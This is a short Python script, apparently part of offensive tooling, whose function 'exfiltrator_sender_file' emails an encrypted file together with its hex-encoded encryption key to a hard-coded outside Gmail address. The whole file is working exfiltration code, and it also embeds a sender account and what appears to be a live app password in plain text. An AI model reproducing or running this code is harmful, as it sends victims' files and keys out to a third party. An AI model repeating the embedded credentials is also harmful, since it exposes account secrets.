
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base      import MIMEBase
from email                  import encoders
import os

SENDER_EMAIL  = "kareemfunyboy@gmail.com"
SENDER_PASSWORD = "livo zdhr lqwp dvav"
RECIEVER_EMAIL   = "hpgkareem@gmail.com"
SMTP_PORT      = 587
SMTP_SERVER    = "smtp.gmail.com"

def exfiltrator_sender_file(subject: str, file_path: str, key: bytes):
    """Attach the encrypted file and the hex‐encoded key, send via SMTP."""
    msg = MIMEMultipart()
    msg['From']    = SENDER_EMAIL
    msg['To']      = RECIEVER_EMAIL
    msg['Subject'] = subject

    # attach encrypted file
    with open(file_path, 'rb') as f:
        part = MIMEBase('application','octet-stream')
        part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
        msg.attach(part)

    # attach key
    key_part = MIMEBase('application','octet-stream')
    key_hex  = key.hex().encode()
    key_part.set_payload(key_hex)
    encoders.encode_base64(key_part)
    key_part.add_header('Content-Disposition', 'attachment; filename="key.txt"')
    msg.attach(key_part)

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as srv:
        srv.starttls()
        srv.login(SENDER_EMAIL, SENDER_PASSWORD)
        srv.send_message(msg)

    print("check your email ✉️ for the encrypted files and the key.")
